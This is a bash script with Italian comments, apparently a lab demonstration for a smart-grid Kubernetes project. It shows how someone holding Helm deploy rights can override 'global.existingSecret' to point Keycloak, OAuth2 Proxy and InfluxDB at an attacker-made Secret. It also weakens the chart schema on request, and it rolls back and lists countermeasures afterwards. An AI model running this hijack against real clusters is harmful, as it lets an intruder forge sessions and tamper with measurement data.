#!/usr/bin/env bash
# =============================================================================
# Attacco dimostrativo A3 - Iniezione di credenziali via override del Secret in Helm
#
# MODELLO DI ATTACCANTE (vedi security-demos/modello-attaccante-04-06.md)
#   ATTENZIONE: questo e' l'UNICO dei tre attacchi che NON e' da outsider, e lo
#   dichiariamo apertamente. Il deploy di questo progetto e' 'helm upgrade'
#   eseguito LOCALMENTE dall'operatore (nessun GitOps). Per sostituire la fonte
#   delle credenziali serve il permesso di fare 'helm upgrade' sulla release:
#   un privilegio che un outsider non ha. Lo modelliamo quindi come:
#     - INSIDER del piano di deploy (operatore infedele), oppure
#     - OUTSIDER che ha RUBATO le credenziali di deploy (kubeconfig/accesso Helm).
#
#   Anche con questa premessa restiamo ai PRIVILEGI MINIMI: l'attaccante usa
#   SOLO due capacita' ('create secret' + 'helm upgrade'), non e' cluster-admin,
#   non tocca i nodi. E resta ZERO-KNOWLEDGE sui VALORI: non conosce i segreti
#   reali; scopre la misconfig LEGGENDO il chart (che 'global.existingSecret' e'
#   un nome sovrascrivibile) e copia solo i NOMI delle chiavi, mai i valori.
#
# Misconfig studiata: STRIDE riga 19, "Helm allows secret name override".
# Riferimenti: MITRE ATT&CK T1565 "Data Manipulation", T1078 "Valid Accounts";
# NSA/CISA Kubernetes Hardening Guidance 1.2 (gestione dei Secret, RBAC);
# letteratura su Helm value injection / supply chain.
#
# NOTA sul chart di questo progetto: il chart CORRETTO vincola gia'
# 'global.existingSecret' con enum:["auth-secrets"] in values.schema.json,
# quindi l'override viene RIFIUTATO e la catena si ferma -- ed e' il risultato
# desiderato. Per vedere l'attacco andare a segno serve una variante VULNERABILE
# del chart (schema senza vincolo); vedi SIMULA_SCHEMA_DEBOLE.
#
# REVERSIBILITA': prima dell'upgrade salva la revisione corrente; un trap EXIT
# esegue 'helm rollback' e cancella il Secret ostile. Nessuna credenziale reale
# stampata: i valori iniettati sono marcatori evidenti. SOLO su Minikube.
#
# Uso:
#   ./06-attacco-helm-secret-injection.sh [release] [namespace] [percorso-chart]
#   SIMULA_SCHEMA_DEBOLE=1 ./06-...     # modella il chart VULNERABILE (schema senza vincolo)
# =============================================================================
set -euo pipefail

RELEASE="${1:-smartgrid}"
NS="${2:-smartgrid}"
SIMULA_SCHEMA_DEBOLE="${SIMULA_SCHEMA_DEBOLE:-0}"
EVIL="attacker-controlled-secret"
INJECT_MARK="INJECTED-BY-ATTACKER"    # valore evidente, NON una credenziale reale

line() { printf '\n=== %s\n' "$1"; }
stop() { printf '\n>>> CATENA FERMATA (%s): %s\n' "$1" "$2"; }
need() { command -v "$1" >/dev/null || { echo "serve '$1' nel PATH"; exit 1; }; }
need kubectl; need helm

# --- percorso del chart (cerca charts/smartgrid salendo dalle cartelle) -------
CHART="${3:-}"
if [ -z "$CHART" ]; then
  d="$(cd "$(dirname "$0")" && pwd)"
  while [ "$d" != "/" ]; do
    [ -f "$d/charts/smartgrid/Chart.yaml" ] && CHART="$d/charts/smartgrid" && break
    d="$(dirname "$d")"
  done
fi
[ -n "$CHART" ] && [ -f "$CHART/Chart.yaml" ] || { echo "chart non trovato: passarlo come 3o argomento"; exit 1; }

kubectl get ns "$NS" >/dev/null || { echo "namespace '$NS' non trovato"; exit 1; }
if ! helm status "$RELEASE" -n "$NS" >/dev/null 2>&1; then
  echo "release Helm '$RELEASE' non trovata nel namespace '$NS'."
  echo "Questo attacco agisce su una release viva: installala prima con"
  echo "  helm install $RELEASE $CHART -n $NS"
  exit 1
fi

# nome del Secret attuale e revisione corrente (per il rollback)
CUR_SECRET="$(helm get values "$RELEASE" -n "$NS" -a -o json 2>/dev/null \
  | grep -o '"existingSecret"[^,}]*' | head -n1 | sed 's/.*:\s*"\(.*\)".*/\1/')"
CUR_SECRET="${CUR_SECRET:-auth-secrets}"
PREV_REV="$(helm status "$RELEASE" -n "$NS" -o json 2>/dev/null | grep -o '"version":[0-9]*' | head -n1 | grep -o '[0-9]*')"

# --- chart effettivo usato dall'upgrade: reale, o copia con schema indebolito -
ATK_CHART="$CHART"
TMP=""
if [ "$SIMULA_SCHEMA_DEBOLE" = "1" ]; then
  TMP="$(mktemp -d)"; cp -r "$CHART" "$TMP/chart"; ATK_CHART="$TMP/chart"
  if [ -f "$ATK_CHART/values.schema.json" ]; then
    python3 - "$ATK_CHART/values.schema.json" <<'PY' 2>/dev/null || true
import json,sys
p=sys.argv[1]; d=json.load(open(p))
def weaken(node):
    if not isinstance(node,dict): return
    props=node.get("properties",{})
    if "existingSecret" in props:
        props["existingSecret"]={"type":"string","minLength":1}   # vincolo rimosso: nome libero
    for v in props.values(): weaken(v)
weaken(d); json.dump(d,open(p,"w"),indent=2)
PY
  fi
fi

cleanup() {
  set +e
  echo; echo "(ripristino...)"
  if [ -n "${PREV_REV:-}" ]; then
    helm rollback "$RELEASE" "$PREV_REV" -n "$NS" >/dev/null 2>&1 \
      && echo "(pulizia: helm rollback a revisione $PREV_REV)" \
      || helm upgrade "$RELEASE" "$CHART" -n "$NS" --reuse-values \
           --set "global.existingSecret=$CUR_SECRET" >/dev/null 2>&1 \
         && echo "(pulizia: existingSecret riportato a '$CUR_SECRET')"
  fi
  kubectl delete secret "$EVIL" -n "$NS" --ignore-not-found >/dev/null 2>&1
  [ -n "$TMP" ] && rm -rf "$TMP"
  echo "(pulizia: Secret ostile '$EVIL' rimosso)"
}
trap cleanup EXIT

echo "MODELLO: insider del deploy / credenziali di deploy rubate (NON outsider)."
echo "Privilegi usati: SOLO 'create secret' + 'helm upgrade'. Zero-knowledge sui valori."

# -----------------------------------------------------------------------------
# 1. SCOPERTA (leggendo il chart): 'global.existingSecret' e' sovrascrivibile?
# -----------------------------------------------------------------------------
line "1. L'attaccante legge il chart: il nome del Secret e' un valore libero?"
echo "   existingSecret corrente: $CUR_SECRET  (revisione Helm: ${PREV_REV:-?})"
if [ -f "$ATK_CHART/values.schema.json" ] && grep -q '"enum"' "$ATK_CHART/values.schema.json" \
   && grep -A4 '"existingSecret"' "$ATK_CHART/values.schema.json" | grep -q '"enum"'; then
  echo "   lo schema VINCOLA existingSecret (enum/pattern): override non previsto."
else
  echo "   lo schema NON vincola existingSecret (nome libero): override possibile. Misconfig presente."
fi

# -----------------------------------------------------------------------------
# 2. ATTACCO (a): crea un Secret proprio con credenziali NOTE (minimo privilegio)
# -----------------------------------------------------------------------------
line "2. L'attaccante crea un Secret proprio con credenziali che conosce"
echo "-- copio i soli NOMI delle chiavi dal Secret legittimo (mai i valori):"
KEYLIST="$(kubectl get secret "$CUR_SECRET" -n "$NS" -o go-template='{{range $k,$v := .data}}{{$k}}{{"\n"}}{{end}}' 2>/dev/null || true)"
if [ -z "$KEYLIST" ]; then
  echo "   (Secret '$CUR_SECRET' non leggibile: uso chiavi tipiche dello stack)"
  KEYLIST=$'OAUTH2_PROXY_CLIENT_SECRET\nOAUTH2_PROXY_COOKIE_SECRET\nINFLUXDB_TOKEN'
fi
SETARGS=""
for k in $KEYLIST; do
  [ -n "$k" ] || continue
  SETARGS="$SETARGS --from-literal=${k}=${INJECT_MARK}-${k}"
  echo "   chiave iniettata: $k = ${INJECT_MARK}-${k}"
done
# shellcheck disable=SC2086
kubectl create secret generic "$EVIL" -n "$NS" $SETARGS \
  --dry-run=client -o yaml | kubectl apply -f - >/dev/null
echo "   Secret ostile '$EVIL' creato."

# -----------------------------------------------------------------------------
# 3. ATTACCO (b): un solo --set dirotta lo stack sul Secret dell'attaccante
#    Riesce solo se lo schema non vincola il nome. Altrimenti la catena si ferma.
# -----------------------------------------------------------------------------
line "3. Prova a dirottare lo stack: helm upgrade --set global.existingSecret=$EVIL"
UP_OUT="$(helm upgrade "$RELEASE" "$ATK_CHART" -n "$NS" --reuse-values \
  --set "global.existingSecret=$EVIL" --wait --timeout 90s 2>&1 || true)"
if printf '%s' "$UP_OUT" | grep -qiE "don't meet|does not meet|schema|enum|allowed"; then
  stop "passo 3" "l'override e' RIFIUTATO dallo schema (existingSecret vincolato)."
  printf '%s\n' "$UP_OUT" | grep -iE "schema|enum|existingSecret|allowed" | sed 's/^/    /' | head -n 4
  echo "    Con enum/pattern nello schema (o nome fisso in _helpers.tpl) l'attacco non parte."
  echo; echo "RISULTATO: misconfig 3 ASSENTE -> stack non dirottato. (Nel chart corretto e' cosi'.)"
  exit 0
fi
NEWREV="$(helm status "$RELEASE" -n "$NS" -o json 2>/dev/null | grep -o '"version":[0-9]*' | head -n1 | grep -o '[0-9]*')"
echo "   upgrade applicato (nuova revisione: ${NEWREV:-?})."

# -----------------------------------------------------------------------------
# 4. PROVA D'IMPATTO: i workload ora puntano al Secret dell'attaccante
# -----------------------------------------------------------------------------
line "4. Impatto: i workload vivi puntano al Secret dell'attaccante"
HITS="$(kubectl get deploy,statefulset -n "$NS" -o json | grep -c "\"$EVIL\"" || true)"
echo "   riferimenti a '$EVIL' nei workload: $HITS"
kubectl get deploy,statefulset -n "$NS" -o yaml | grep -n "$EVIL" | head -n 3 | sed 's/^/   /' || true
echo "   => Keycloak/OAuth2 Proxy/InfluxDB ripartono con credenziali SCELTE dall'attaccante:"
echo "      col client secret puo' forgiare sessioni/token; col token InfluxDB puo'"
echo "      leggere o falsificare le misure PMU (attacco all'INTEGRITA' dei dati)."

echo
echo "CONCLUSIONE: chi puo' fare 'helm upgrade' (operatore infedele o credenziali"
echo "di deploy rubate) sostituisce la fonte delle credenziali con un solo --set,"
echo "SE il chart lascia libero il nome del Secret. Contromisure: nome fisso/legato"
echo "alla release, enum/pattern in values.schema.json, Secret separati per"
echo "componente, RBAC su chi fa upgrade (README sez. 3, mitigazioni.md sez. 3)."
